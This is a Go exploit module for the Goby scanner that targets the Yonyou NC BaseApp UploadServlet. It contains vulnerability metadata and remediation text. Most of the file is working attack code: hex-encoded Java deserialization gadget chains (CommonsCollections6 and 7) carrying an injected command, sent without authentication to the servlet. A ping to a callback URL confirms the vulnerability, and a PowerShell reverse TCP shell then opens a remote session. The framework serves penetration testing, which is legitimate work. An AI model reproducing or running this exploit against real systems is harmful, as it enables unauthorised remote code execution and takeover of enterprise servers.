package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC BaseApp UploadServlet Deserialization RCE",
    "Description": "Yonyou NC is an enterprise-level management software, widely used in large and medium-sized enterprises.Realize modeling, development, inheritance, operation, management integration of IT solution information platform.UFIDA NC for C/S architecture, the use of Java programming language development, the client can directly use UClient, the server interface for HTTP.A page of UFIDA NC6.5, there is arbitrary file upload vulnerability.The cause of vulnerability is that there is no type restriction at the uploading file, and an attacker without authentication can take advantage of this vulnerability by sending special data packets to the target system, and a remote attacker who successfully takes advantage of this vulnerability can upload any file to the target system to execute commands.",
    "Impact": "Yonyou NC BaseApp UploadServlet Deserialization RCE",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Yonyou-NC",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "用友 NC BaseApp 文件上传漏洞",
            "Description": "<p>用友NC是企业级管理软件，广泛应用于大中型企业。实现IT解决方案信息化平台的建模、开发、继承、运行、管理一体化。用友NC为C/S架构，使用Java编程 语言开发，客户端可以直接使用UClient，服务器接口为HTTP。用友NC6.5 BaseApp 存在任意文件上传漏洞。漏洞产生的原因是上传文件没有类型限制，攻击者 无需身份验证可以通过向目标系统发送特殊数据包来利用此漏洞，成功利用此漏洞的远程攻击者可以将任何文件上传到目标系统执行命令。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友 NC&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">BaseApp&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">存在任意文件上传漏洞，攻击者可以上传任意文件，在服务器上执行任意代码，获取 webshell 等。</span><br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Yonyou-NC",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Yonyou NC BaseApp UploadServlet Deserialization RCE",
            "Description": "Yonyou NC is an enterprise-level management software, widely used in large and medium-sized enterprises.Realize modeling, development, inheritance, operation, management integration of IT solution information platform.UFIDA NC for C/S architecture, the use of Java programming language development, the client can directly use UClient, the server interface for HTTP.A page of UFIDA NC6.5, there is arbitrary file upload vulnerability.The cause of vulnerability is that there is no type restriction at the uploading file, and an attacker without authentication can take advantage of this vulnerability by sending special data packets to the target system, and a remote attacker who successfully takes advantage of this vulnerability can upload any file to the target system to execute commands.",
            "Impact": "Yonyou NC BaseApp UploadServlet Deserialization RCE",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Yonyou-NC",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "app=\"Yonyou-UFIDA-NC\"",
    "GobyQuery": "app=\"Yonyou-UFIDA-NC\"",
    "Author": "go0p",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2020-12-07",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "5.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/service/~baseapp/UploadServlet"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "java.io",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/service/~baseapp/UploadServlet"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "java.io",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_powershell",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Yonyou-UFIDA-NC"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10179"
}`

	ncBaseAppbuildCommandHex := func(cmd string) string {
		cmdHex := fmt.Sprintf("%04x", len(cmd))
		cmdHex += fmt.Sprintf("%x", cmd)
		return cmdHex
	}
	ncBaseAppCommonsCollections6Hex := func(cmd string) string {
		payload := "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174"
		payload += ncBaseAppbuildCommandHex(cmd)
		payload += "740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878"
		return payload
	}
	ncBaseAppCommonsCollections7Hex := func(cmd string) string {
		payload := "aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174"
		payload += ncBaseAppbuildCommandHex(cmd)
		payload += "740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278"
		return payload
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomHex := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(randomHex)
			gadGetList := make([]string, 0)
			allgadGetList := append(gadGetList, ncBaseAppCommonsCollections6Hex("ping -n 1 "+checkUrl), ncBaseAppCommonsCollections7Hex("ping -n 1 "+checkUrl))
			for _, payloadBStr := range allgadGetList {
				payload, _ := hex.DecodeString(payloadBStr)
				cfg := httpclient.NewPostRequestConfig("/service/~baseapp/UploadServlet")
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg.VerifyTls = false
				cfg.Data = string(payload)
				httpclient.DoHttpRequest(hostinfo, cfg)
				if godclient.PullExists(randomHex, time.Second*15) {
					stepLogs.VulURL = hostinfo.String()
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["AttackType"].(string) == "goby_shell_powershell" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByPowershell(rp)
					gadGetList := make([]string, 0)
					allgadGetList := append(gadGetList, ncBaseAppCommonsCollections7Hex(cmd), ncBaseAppCommonsCollections6Hex(cmd))
					for _, payloadBStr := range allgadGetList {
						payload, _ := hex.DecodeString(payloadBStr)
						cfg := httpclient.NewPostRequestConfig("/service/~baseapp/UploadServlet")
						cfg.VerifyTls = false
						cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg.Data = string(payload)
						_, _ = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
						select {
						case webConsleID := <-waitSessionCh:
							log.Println("[DEBUG] session created at:", webConsleID)
							if u, err := url.Parse(webConsleID); err == nil {
								expResult.Success = true
								expResult.OutputType = "html"
								sid := strings.Join(u.Query()["id"], "")
								expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
								return expResult
							}
						case <-time.After(time.Second * 10):
						}
					}
				}
			}
			return expResult
		},
	))
}
